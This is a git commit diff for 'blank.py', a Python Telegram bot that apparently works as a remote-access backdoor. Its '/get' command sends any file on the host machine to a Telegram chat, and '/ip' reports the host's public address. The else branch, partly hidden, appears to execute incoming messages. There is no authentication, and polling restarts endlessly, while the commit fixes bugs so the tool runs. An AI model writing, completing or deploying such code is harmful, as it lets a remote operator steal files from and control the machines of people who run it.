d92c34021f8ad9f01c051a640b1b435963182052
Artem <79601745+Sovenok-Hacker@users.noreply.github.com>
2022-08-30 14:19:05 +0300

    Update blank.py

--- blank.py
+++ blank.py
@@ -1,16 +1,16 @@
-import telebot, requests
+import telebot, requests, os, time
 token = '<token>'
 bot = telebot.TeleBot(token)
 @bot.message_handler(content_types=['text'])
 def handle(message):
-    if message.text.startswith('get '):
-        filename = message.replace('get ', '', 1)
+    if message.text.startswith('/get '):
+        filename = message.text.replace('/get ', '', 1)
         if os.path.exists(filename):
           with open(filename, 'rb') as file:
               bot.send_document(message.chat.id, file, visible_file_name=filename)
         else:
              bot.send_message(message.chat.id, 'File is not exists.')
-    elif message.text == 'ip':
+    elif message.text == '/ip':
         bot.send_message(message.chat.id, requests.get('https://ifconfig.me/ip').text)
     else:
         try:
@@ -19,7 +19,6 @@ def handle(message):
             bot.send_message(message.chat.id, f'Error: {e}.')
 while True:
     try:
-        print('run')
         bot.polling()
     except:
-        pass
+        time.sleep(2)
